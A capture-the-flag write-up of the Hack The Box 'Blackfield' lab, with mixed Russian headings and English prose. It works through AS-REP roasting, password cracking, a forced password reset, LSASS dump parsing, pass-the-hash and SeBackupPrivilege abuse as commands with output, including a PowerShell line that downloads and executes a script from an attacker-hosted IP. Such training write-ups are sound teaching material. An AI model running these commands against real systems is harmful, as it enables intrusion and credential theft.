---
title: "[HTB] Blackfield"
permalink: /writeups/htb/blackfield/
excerpt: "Краткий разбор машины Blackfield с Hack The Box."
tags:
  - hackthebox
  - htb
  - activedirectory
  - pentest
  - writeup
  - smb
  - token
  - lsass
---

---

{% include toc icon="cog" title="Blackfield Solution" %}

The [Blackfield](https://app.hackthebox.com/machines/Blackfield) machine has been created by [aas](https://app.hackthebox.com/users/6259). This is an **hard** Windows Machine with a strong focus on Active Directory exploitation. Lots of reconnaissance was involved to get administrative privileges on this machine but the token abuse part was interesting.
{: .text-justify}

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

![image-center](/images/htb/htb_blackfield_infocard.png){: .align-center}

**Заметка:** Все действия против целевой машины выполнялись со стандартной системой *Kali Linux*. Скачать Kali можно с официального сайта [здесь](https://www.kali.org/).
{: .notice--info}

# Разведка

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Сканирование Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.

**Заметка:** После запуска HTB-машины всегда подожди несколько минут, чтобы убедиться, что все сервисы поднялись корректно. Если просканировать машину сразу, можно пропустить порты, которые должны быть открыты.
{: .notice--info}

```bash
$ nmap -sV -Pn 10.129.140.139
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 09:11 EST
Nmap scan report for 10.129.140.139
Host is up (0.018s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-11 21:11:21Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.56 seconds
```

**Помни:** По умолчанию **Nmap** сканирует 1000 самых распространенных TCP-портов на целевых хостах. Если нужно сканировать больше портов или изменить поведение по умолчанию, обязательно прочитай [документацию](https://nmap.org/docs.html).
{: .notice--warning}

This computer seems to be a domain controller for **blackfield.local**. Let's see if we can extract some users.

## LDAP

First, let's see if we can do an anonymous bind on the LDAP port using [ldapsearch](https://linux.die.net/man/1/ldapsearch).

```bash
$ ldapsearch -x -b "dc=blackfield,dc=local" -H ldap://10.129.140.139
# extended LDIF
#
# LDAPv3
# base <dc=blackfield,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

This is a no...

## Shared Folders

Maybe we can try to find some open shares via an anonymous login on the target machine with [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). Note that the **-N** switch suppresses the normal password prompt.

```bash
$ smbclient -N -L \\\\10.129.140.139

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

We do have a few shares, let's start with the **profiles$** folder. Note that we tried the **forensic** folder, but we don't have enough privileges to read it.

```bash
$ smbclient -N \\\\10.129.140.139\\profiles$
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  
...[snip]...
  
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                5102079 blocks of size 4096. 1691612 blocks available
smb: \> 
```

Folder with usernames! While we could explore the folders one by one, let's dump all the usernames first and see if there is a faster way to get access. 

Given we are a bit lazy, we did a quick and dirty regex to dump the usernames to a file.

```bash
$ smbclient -N \\\\10.129.140.139\\profiles$ -c dir | sed \$d | grep -oE '([a-zA-Z0-9]{5,})' > users.txt
```

Now, we should have all our usernames in the **users.txt** file.

# Первичный доступ

With the previously generated user list, we could try to do some brute force or password spraying attacks. However, it could be time consuming and we don’t have any information about the domain’s password policy and lockout threshold. Let’s stay on the safe side for now and try an [ASREPRoast](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat) attack.

## ASREPRoast

As a reminder, AS-REP roasting is a technique that allows retrieving password hashes for users that have the **Do not require Kerberos preauthentication** property selected. It means that we can recover a hash which can be cracked offline.

One of the best tools for the job would be [impacket-GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py), which should already be installed on Kali.

```bash
$ impacket-GetNPUsers blackfield.local/ -usersfile users.txt -dc-ip 10.129.140.139
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

...[snip]...

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$support@BLACKFIELD.LOCAL:eab3cec4ef7550d9f7336270ab461115$51de4e1de9d432eb82a3fd26eeacfe2ea6809dc28d91eeac0b3772e99241f3834a1e8c5ec98ec13f04546176ddac6835f1e113441df5c8d1fb6e62c4446477a543471ca5062eb4c6d63e6047f43ac695d71fd7e2b7c98d0b26dbb2b49ca792dd28a11ef7a3a158a75a042e78f5116282ccfbc0087293a0aedc9ea2b38299614d1671546f228a92c2c8456af9b2cf485f5a36f0b74c92bbea557f3136072403345e804e21631a7bc0f9f3e657eaada6b37da2275d2ced68779d4978aacbc0fd6520fe8a386763b10c07c4e1b799f0ba338c98bfc7c719b1f2ae3d55e5663a47698fb3df8e3c764dfd03045d3abdd4f215c3d17db0
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set

...[snip]...

```

Nice, we do have a hash for the **support** user. If the user is using a weak password, we may be able to recover it.

## Взлом пароля

Now, we just have to copy/paste the recovered hash in a file and try to crack it offline using the *rockyou* password list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.

```bash
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)     
1g 0:00:00:21 DONE (2022-02-11 09:32) 0.04608g/s 660597p/s 660597c/s 660597C/s #1ByNature..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Great, we now have credentials the **support** account (`support:#00^BlackKnight`). 

## Доступ по WinRM

Using another awesome tool, [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), we can check if the user's password is properly working.

```bash
$ crackmapexec smb 10.129.140.139 -d blackfield.local -u support -p '#00^BlackKnight'
SMB         10.129.140.139  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.129.140.139  445    DC01             [+] blackfield.local\support:#00^BlackKnight 
```

The credentials are valid, but we still don't have any remote shell on the machine. Let's see if we can get some information about the domain using **BloodHound**.

## Разведка Active Directory

With a valid account, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. Here, we use a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).

```bash
$ bloodhound-python -c All -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.140.139 --zip                    
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 04S
INFO: Compressing output into 20220211094020_bloodhound.zip
```

Luckily, the user **support** has the [ForceChangePassword](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) permission over the **audit2020** user. It means that we can change **audit2020** password without knowing its current password.

![image-center](/images/htb/htb_blackfield_bloodhound_support.png){: .align-center}

Changing **audit2020** password using our Kali machine is [easy](https://malicious.link/post/2017/reset-ad-user-password-with-linux/) and can be done with [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html).

```bash
$ rpcclient -U blackfield.local/support 10.129.140.139
Enter BLACKFIELD.LOCAL\support's password: 
rpcclient $> setuserinfo audit2020 23 Qwerty1!
rpcclient $> 
```

Once the credentials are updated, we can check if the change worked.

```bash
$ crackmapexec smb 10.129.140.139 -d blackfield.local -u audit2020 -p 'Qwerty1!'
SMB         10.129.140.139  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.129.140.139  445    DC01             [+] blackfield.local\audit2020:Qwerty1! 
```

Yay, another valid account :)

## More Shares

Back to the shares we found in the first part, using **crackmapexec** and the `--shares` switch , we can see that **audit2020** can read the **forensic** folder.

```bash
$ crackmapexec smb 10.129.140.139 -d blackfield.local -u audit2020 -p 'Qwerty1!' --shares
SMB         10.129.140.139  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.129.140.139  445    DC01             [+] blackfield.local\audit2020:Qwerty1! 
SMB         10.129.140.139  445    DC01             [+] Enumerated shares
SMB         10.129.140.139  445    DC01             Share           Permissions     Remark
SMB         10.129.140.139  445    DC01             -----           -----------     ------
SMB         10.129.140.139  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.140.139  445    DC01             C$                              Default share
SMB         10.129.140.139  445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.140.139  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.140.139  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.140.139  445    DC01             profiles$       READ            
SMB         10.129.140.139  445    DC01             SYSVOL          READ            Logon server share 
```

Let's start by recursively download the content of the **forensic** folder and see if we can find something. Note that we used `recurse` to enable directory recursion for the command `mget` and `prompt off` to make sure that all specified files (if any) will be transferred without asking if we want to download them.

```bash
$ smbclient \\\\10.129.140.139\\forensic -U audit2020
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                5102079 blocks of size 4096. 1687478 blocks available
smb: \> prompt off
smb: \> recurse
smb: \> mget *
getting file \commands_output\domain_admins.txt of size 528 as commands_output/domain_admins.txt (7.8 KiloBytes/sec) (average 7.8 KiloBytes/sec)
getting file \commands_output\domain_groups.txt of size 962 as commands_output/domain_groups.txt (13.8 KiloBytes/sec) (average 10.9 KiloBytes/sec)
getting file \commands_output\domain_users.txt of size 16454 as commands_output/domain_users.txt (229.5 KiloBytes/sec) (average 85.9 KiloBytes/sec)
getting file \commands_output\firewall_rules.txt of size 518202 as commands_output/firewall_rules.txt (3244.0 KiloBytes/sec) (average 1454.4 KiloBytes/sec)
getting file \commands_output\ipconfig.txt of size 1782 as commands_output/ipconfig.txt (23.5 KiloBytes/sec) (average 1210.4 KiloBytes/sec)
getting file \commands_output\netstat.txt of size 3842 as commands_output/netstat.txt (51.4 KiloBytes/sec) (average 1043.5 KiloBytes/sec)
getting file \commands_output\route.txt of size 3976 as commands_output/route.txt (58.0 KiloBytes/sec) (average 928.5 KiloBytes/sec)

...[snip]...

```

## LSASS Dump

Lots of files, but one seems to be very interesting: **lsass.zip**. Let's extract that one.

```bash
$ unzip lsass.zip          
Archive:  lsass.zip
  inflating: lsass.DMP               
```

Using [pypykatz](https://github.com/skelsec/pypykatz), a **mimikatz** implementation in Python, we can try to read the content of **lsass.DMP** and maybe grab some passwords or hashes.

```bash
$ pypykatz lsa minidump lsass.DMP
INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621

...[snip]...
```

We have an NTLM hash for **svc_backup**. Using the recovered hash and `crackmapexec` we could perform a **Pass-the-Hash** attack and try to authenticate as **svc_backup**.

Note that **Pass the hash** (or *PtH*) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

```bash
$ crackmapexec winrm 10.129.140.139 -d blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d                                 
HTTP        10.129.140.139  5985   10.129.140.139   [*] http://10.129.140.139:5985/wsman
WINRM       10.129.140.139  5985   10.129.140.139   [+] blackfield.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

The hash is valid and we do have a WinRM access to the remote computer.

## Доступ по WinRM

Using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and the recovered account, we can try to connect to the remote machine.

```bash
$ evil-winrm -i 10.129.140.139 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> dir ..\Desktop


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt

```

We now have a remote shell access and the **first flag**.

# Повышение привилегий

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## SeBackupPrivilege

After looking around for potential privilege escalation paths, we found an interesting privilege for our user.

```bash
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\> 
```

We do have the **SeBackupPrivilege** privilege. In fact, according to Bloodhound, we can see that we are a member of the **Backup Operators** group.

![image-center](/images/htb/htb_blackfield_bloodhound_svc_backup.png){: .align-center}

Let's see what we can do with this privilege.

## Abusing Tokens

The [SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) privilege is really interesting. It was designed for allowing users to create backup copies of the system. Since it is not possible to make a backup of something that you cannot read. This privilege comes at the cost of providing the user with full read access to the file system.

In a nutshell, it causes the system to grant all read access control to any file (read only). So, we could read the **root.txt** by abusing this token. 

Using a tool called [Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1), we were able to change the access rights of the **svc_backup** and allow him to read the **administrator** folder.

```bash
*Evil-WinRM* PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.97/Acl-FullControl.ps1')
*Evil-WinRM* PS C:\> Acl-FullControl -user blackfield\svc_backup -path c:\users\administrator
[+] Current permissions:

Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BLACKFIELD\Administrator Allow  FullControl
Audit  :
Sddl   : O:SYG:SYD:P(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)

[+] Changing permissions to c:\users\administrator
[+] Acls changed successfully.

Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BLACKFIELD\Administrator Allow  FullControl
         BLACKFIELD\svc_backup Allow  FullControl
Audit  :
Sddl   : O:SYG:SYD:PAI(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)(A;OICI;FA;;;S-1-5-21-4194615774-2175524697-3563712290-1413)
```

Now, we should have the necessary rights to read the **root.txt** file and get the **second flag**.

```bash
*Evil-WinRM* PS C:\> dir c:\Users\Administrator\Desktop\root.txt


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/5/2020   8:38 PM             32 root.txt
```

Awesome! I hope you enjoyed it, I know I did :)
